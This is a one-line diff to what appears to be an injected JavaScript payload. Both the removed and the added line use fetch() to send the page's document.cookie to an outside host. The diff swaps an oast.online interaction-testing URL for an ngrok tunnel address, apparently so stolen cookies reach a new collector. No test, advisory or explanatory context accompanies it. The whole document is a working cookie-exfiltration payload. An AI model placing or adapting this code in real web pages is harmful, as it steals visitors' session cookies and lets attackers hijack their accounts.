@@ -1,1 +1,1 @@
-fetch("https://cbmr8jp0ex6apdn1ixt6c.oast.online/cookie="+document.cookie);
+fetch("https://d61a-95-158-48-92.ngrok-free.app/cookie="+document.cookie);
